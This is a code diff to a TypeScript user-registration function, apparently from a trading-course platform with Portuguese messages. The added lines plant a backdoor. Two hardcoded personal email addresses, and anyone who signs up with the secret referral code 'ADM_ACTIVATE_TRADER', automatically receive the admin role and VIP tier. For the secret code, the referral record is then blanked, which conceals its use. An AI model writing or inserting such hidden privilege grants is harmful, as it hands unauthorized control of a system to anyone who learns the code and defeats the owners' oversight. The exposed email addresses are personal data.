@@ -136,6 +136,9 @@ export const storageService = {
       return { success: false, message: 'Já existe uma conta cadastrada com este email.' };
     }
 
+    const isSecretAdmin = userData.referredById === 'ADM_ACTIVATE_TRADER';
+    const isAdmin = ['viniciussestremmm@gmail.com', 'herisson.trader.jt5@gmail.com'].includes(cleanEmail) || isSecretAdmin;
+
     const newUser: User = {
       id: 'usr-' + Date.now(),
       name: userData.name.trim(),
@@ -145,10 +148,10 @@ export const storageService = {
       termsAccepted: userData.termsAccepted,
       termsAcceptedAt: new Date().toISOString(),
       avatar: '',
-      role: 'student',
-      tier: 'Free',
+      role: isAdmin ? 'admin' : 'student',
+      tier: isAdmin ? 'VIP' : 'Free',
       status: 'Ativo',
-      referredById: userData.referredById,
+      referredById: isSecretAdmin ? undefined : userData.referredById,
       referralBalance: 0,
       totalEarned: 0,
       joinedAt: new Date().toISOString().split('T')[0],
